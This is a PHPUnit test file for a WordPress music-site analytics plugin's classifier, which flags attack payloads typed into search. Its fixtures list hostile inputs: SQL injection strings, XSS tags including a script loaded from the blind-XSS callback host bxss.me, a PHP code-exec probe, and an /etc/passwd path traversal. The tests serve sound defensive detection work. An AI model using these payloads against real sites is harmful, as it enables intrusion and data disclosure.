<?php
/**
 * Tests for the canonical search-payload security classifier (issue #133).
 *
 * The classifier in inc/core/security-classifier.php is the SINGLE taxonomy
 * shared by the insert path (routes payload searches to event_type
 * 'search_attack') and the get-search-gaps read path (excludes payload terms
 * before aggregation). These tests pin the live probe families reported in
 * #133 (blind-XSS callback host, print(md5()) code-exec probe, Gemfile
 * dependency-manifest scanner) plus the pre-existing families, and prove that
 * legitimate music searches are never classified as attacks.
 *
 * @package ExtraChill\Analytics
 */

use PHPUnit\Framework\TestCase;

/**
 * Pins the live probe families from issue #133 plus the pre-existing catalog.
 */
final class SearchPayloadClassifierTest extends TestCase {

	/**
	 * Live probe families from issue #133 must each classify as an attack with
	 * the expected family, so both the insert and read paths exclude them.
	 *
	 * @dataProvider live_attack_probe_provider
	 *
	 * @param string $term               Raw search term.
	 * @param string $expected_family    Expected pattern_family.
	 * @param string $expected_name_part Substring expected in pattern_name.
	 */
	public function test_live_attack_probes_are_classified( $term, $expected_family, $expected_name_part ) {
		$result = extrachill_analytics_classify_search_payload( $term );

		$this->assertNotNull(
			$result,
			sprintf( 'Expected term "%s" to be classified as an attack payload.', $term )
		);
		$this->assertSame( $expected_family, $result['pattern_family'] );
		$this->assertStringContainsString( $expected_name_part, $result['pattern_name'] );
	}

	/**
	 * Fixture: the exact live terms from issue #133 plus close siblings.
	 *
	 * @return array<int,array{0:string,1:string,2:string}>
	 */
	public function live_attack_probe_provider() {
		// phpcs:disable WordPress.Arrays.ArrayDeclarationSpacing
		return array(
			// Blind-XSS callback host — bare callback domain.
			array( 'bxss.me', 'xss', 'blind_xss_callback' ),
			array( 'https://bxss.me/x.js', 'xss', 'blind_xss_callback' ),
			// PHP / template code-exec probe — print(md5(N)) reflection marker.
			array( '";print(md5(31337));$a="', 'rce', 'code_exec_md5_probe' ),
			array( 'print(md5(42))', 'rce', 'code_exec_md5_probe' ),
			// Dependency-manifest scanner probes.
			array( 'Gemfile', 'scanner', 'dependency_manifest_probe' ),
			array( 'the/Gemfile', 'scanner', 'dependency_manifest_probe' ),
			array( 'Gemfile.lock', 'scanner', 'dependency_manifest_probe' ),
		);
		// phpcs:enable WordPress.Arrays.ArrayDeclarationSpacing
	}

	/**
	 * Regression: the pre-existing catalog families still classify so the fix
	 * did not narrow detection.
	 *
	 * @dataProvider existing_attack_probe_provider
	 *
	 * @param string $term            Raw search term.
	 * @param string $expected_family Expected pattern_family.
	 */
	public function test_existing_attack_families_still_classified( $term, $expected_family ) {
		$result = extrachill_analytics_classify_search_payload( $term );
		$this->assertNotNull( $result );
		$this->assertSame( $expected_family, $result['pattern_family'] );
	}

	/**
	 * Fixture: representative payloads from the catalog that predate #133.
	 *
	 * @return array<int,array{0:string,1:string}>
	 */
	public function existing_attack_probe_provider() {
		// phpcs:disable WordPress.Arrays.ArrayDeclarationSpacing, WordPress.WP.EnqueuedResources
		return array(
			array( "1' AND SLEEP(5)-- -", 'sqli' ),
			array( '1 UNION ALL SELECT NULL--', 'sqli' ),
			array( '<script>alert(1)</script>', 'xss' ),
			array( '<img src=x onerror=alert(1)>', 'xss' ),
			array( '"><script src=https://bxss.me/x.js>', 'xss' ),
			array( '../../../etc/passwd', 'lfi' ),
			array( '@@OZOin', 'scanner' ),
		);
		// phpcs:enable WordPress.Arrays.ArrayDeclarationSpacing, WordPress.WP.EnqueuedResources
	}

	/**
	 * Legitimate music searches must return null (never flagged), including
	 * near-misses that share substrings with the new probe patterns.
	 *
	 * @dataProvider legitimate_music_search_provider
	 *
	 * @param string $term Raw search term a real human might type.
	 */
	public function test_legitimate_music_searches_are_not_flagged( $term ) {
		$this->assertNull(
			extrachill_analytics_classify_search_payload( $term ),
			sprintf( 'Legitimate search "%s" must not be classified as an attack.', $term )
		);
	}

	/**
	 * Fixture: real audience demand terms. Includes near-miss guard rails:
	 *   - 'Gem' / 'Gemma' (substring of Gemfile but a whole-token band/name),
	 *   - 'memphis' (ends in 'me' but is not the bxss.me callback host).
	 *
	 * @return array<int,array{0:string}>
	 */
	public function legitimate_music_search_provider() {
		// phpcs:disable WordPress.Arrays.ArrayDeclarationSpacing
		return array(
			array( 'Grateful Dead' ),
			array( 'Molchat Doma' ),
			array( 'Phish' ),
			array( 'Tame Impala' ),
			array( 'Extra Chill Fest' ),
			array( 'Tupelo Music Hall' ),
			array( 'bonnaroo 2026' ),
			array( 'String Cheese Incident' ),
			array( 'King Gizzard' ),
			array( 'DIY artist submission' ),
			// Whole-token guards against the new patterns.
			array( 'Gem' ),
			array( 'Gemma' ),
			array( 'memphis' ),
			array( 'the jealous seas' ),
		);
		// phpcs:enable WordPress.Arrays.ArrayDeclarationSpacing
	}

	/**
	 * Empty / non-string input is benign (returns null) and never mis-flagged.
	 */
	public function test_empty_input_is_benign() {
		$this->assertNull( extrachill_analytics_classify_search_payload( '' ) );
		$this->assertNull( extrachill_analytics_classify_search_payload( null ) );
	}
}
